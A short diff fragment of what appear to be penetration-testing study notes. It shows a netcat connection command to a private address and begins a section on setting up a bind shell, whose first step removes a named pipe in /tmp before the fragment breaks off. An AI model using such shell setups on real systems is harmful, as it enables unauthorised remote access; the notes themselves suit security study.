@@ -38,4 +38,12 @@ nc -nv 10.10.10.10 7777
 ```
 
 ESTABLISHING A BIND SHELL
-You need 
+You need to specify a:
+- directory 
+- shell 
+- listener
+1. Delete any possibility of a pipe you are tryna create 
+```
+rm -f /tmp/f
+```
+2. 
